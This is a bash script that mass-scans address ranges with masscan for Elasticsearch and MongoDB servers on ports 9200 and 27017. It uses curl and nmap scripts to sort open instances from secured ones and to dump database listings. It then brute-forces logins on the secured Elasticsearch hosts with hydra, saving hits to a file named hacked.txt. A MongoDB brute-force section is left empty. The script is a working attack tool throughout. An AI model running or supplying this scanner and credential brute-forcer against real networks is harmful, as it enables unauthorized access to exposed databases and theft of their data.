#!/bin/bash

tgkey=""

#Check parametrs
if [ -n "$2" ]
	then
	echo masscan port:$1 hosts:$2
else
	echo "No parameters found. "
	echo "Usage: ./scan.sh port host(/s) Example: ./scan.sh 9200 192.168.0.0/24 OR  ./scan.sh 9200 192.168.0.0/24,172.16.0.0/16 ./scan.sh 27017 192.168.0.0/24,172.16.0.0/16"
	echo "Required: masscan nmap grep awk"
	exit
fi

#Clear report file

if [[ "$1" == "9200" ]]; then
echo "" > elastic.txt
echo "" > elastic_secured.txt
fi

if [[ "$1" == "27017" ]]; then
echo "" > mongodb.txt
fi


#Clear variable for filename
out=$( echo $2 | sed 's/\///g' | sed 's/\,//g' | sed 's/\.//g' )
echo $out 

#Scan targets
masscan -p $1 $2 -oG $out.out

#Find hosts with opened target ports
grep open $out.out | awk {'print $2'} > map.input

#ELK_check
if [[ "$1" == "9200" ]]; then

	cat map.input | while read line
do
	if curl -X GET "$line:9200/" | grep "You Know, for Search";
		then echo $line >> elastic.txt; 
		nmap $line -p$1 --script=elastic | grep "|">> elastic.txt
	fi
	
	if curl -X GET "$line:9200/" | grep "security_exception";
		then echo $line >> elastic_secured.txt;
fi
done
fi

#MGDB_check

if [[ "$1" == "27017" ]]; then

        cat map.input | while read line
do
	mdbstat=$(nmap $line -p$1 --script=mongodb-info.nse | grep -v codeName | grep code | awk {'print $4'})
	
	if  [[ "$mdbstat" == "13" ]]; then echo $line >> mongodb_secured.txt; 
	else
        	echo $line >> mongodb.txt;
		nmap $line -p$1 --script=mongodb-databases.nse | grep "|">> mongodb.txt
        fi
done
fi


#brute secured elastics


if [[ $(find ./ -name elastic_secured.txt -type f -size +1 2>/dev/null) ]]; 

	then /usr/bin/hydra -M ./elastic_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 9200 -o ./hacked.txt http-get /

fi


#brute secured mongo


